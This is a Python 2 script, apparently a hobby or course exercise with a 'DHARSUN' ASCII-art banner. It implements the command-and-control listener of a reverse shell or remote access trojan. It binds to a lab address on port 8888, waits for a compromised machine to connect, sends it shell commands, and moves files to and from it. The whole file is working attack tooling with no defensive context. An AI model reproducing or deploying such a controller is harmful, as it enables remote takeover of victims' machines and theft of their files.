
#!usr/bin/env python

import socket
import json
import base64





print ("""
     ____    _   _      _      ____    ____    _   _   _   _  
    |  _ \  | | | |    / \    |  _ \  / ___|  | | | | | \ | | 
    | | | | | |_| |   / _ \   | |_) | \___ \  | | | | |  \| | 
    | |_| | |  _  |  / ___ \  |  _ <   ___) | | |_| | | |\  | 
    |____/  |_| |_| /_/   \_\ |_| \_\ |____/   \___/  |_| \_| 
    
    
    
                                  ______   
	                       .-        -. 
	                      /            \         
	                     |,  .-.  .-.  ,|      
	                     | )(_ /  \_ )( |
	                     |/     /\     \|    
	           (@_       <__    ^^    __>        
	      _     ) \_______\__|IIIIII|__/____________________/\ 
	     (_)\@8@8{}<_________________________________________/ 
	            )_/         \ IIIIII /                    
	           (@            --------                      
		  \n\n""")



class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Connection Established from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful " + path

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download":
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"

            print(result)
            print("---------------------------------------------------------------------------------------------------")


my_listener = Listener("172.16.5.129", 8888)
my_listener.run()
